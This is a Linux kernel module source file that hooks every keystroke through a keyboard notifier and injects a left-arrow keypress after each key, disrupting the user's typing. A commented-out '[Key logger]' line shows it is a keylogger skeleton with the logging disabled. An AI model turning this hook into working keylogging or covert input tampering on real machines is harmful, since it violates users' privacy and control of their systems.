/* Necessary includes for device drivers */

#include <linux/kernel.h>
#include <asm/uaccess.h>
#include "kbd.h"

int kbd_init(void) {

	idev = input_allocate_device();
	
	if (!idev)
		return -ENOMEM;

	idev->evbit[0] = BIT_MASK(EV_KEY);
	idev->name = "kbd";
	idev->phys = "/kbd/input0";
	idev->id.bustype = BUS_I8042;
	idev->id.vendor = 0x0001;
	idev->id.product = 1;
	idev->id.version = 0;

	set_bit(KEY_LEFT,  idev->keybit);

	int err = input_register_device(idev);

	if(err) {
		printk(KERN_ERR "kbd: Can't register device\n");
		input_free_device(idev);
		idev = NULL;

		return err;
	}

	register_keyboard_notifier(&nb);

	return 0;
}

void kbd_exit(void) {
	unregister_keyboard_notifier(&nb);
	input_unregister_device(idev);
}

int kbd_notifier(struct notifier_block* nblock, unsigned long code, void* _param) {
	struct keyboard_notifier_param *param = _param;

	if(code == KBD_KEYCODE && param->down) {

		if(param->value != KEY_LEFT) {
			input_report_key(idev, KEY_LEFT, 1); /* keypress */
			input_report_key(idev, KEY_LEFT, 0); /* release */

			input_sync(idev);

			//printk(KERN_DEBUG "[Key logger] %c", get_ascii(param->value));
		}
	}

	return NOTIFY_OK;
}

MODULE_LICENSE("Dual BSD/GPL");

module_init(kbd_init);
module_exit(kbd_exit);

